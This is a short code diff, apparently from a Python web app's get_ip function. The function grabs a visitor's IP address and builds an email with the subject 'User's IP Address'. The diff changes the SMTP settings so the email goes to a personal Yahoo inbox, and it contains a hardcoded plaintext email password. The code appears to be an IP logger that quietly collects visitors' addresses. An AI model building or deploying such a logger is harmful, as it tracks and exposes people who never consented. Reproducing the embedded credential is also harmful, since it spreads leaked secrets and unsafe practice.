@@ -8,11 +8,11 @@ def get_ip():
     ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
 
     # Configuração do servidor de email
-    email_server = 'mail.gmx.com'
-    email_port = 587
-    email_sender = 'florzinha2@gmx.com'
+    email_server = 'smtp.mail.yahoo.com'
+    email_port = 465
+    email_sender = 'minadoooo11@yahoo.com'
     email_password = 'prosopopei4'
-    email_recipient = 'petista@gmx.com'
+    email_recipient = 'minadoooo11@yahoo.com'
 
     # Criação da mensagem
     subject = 'Endereço IP do Usuário'
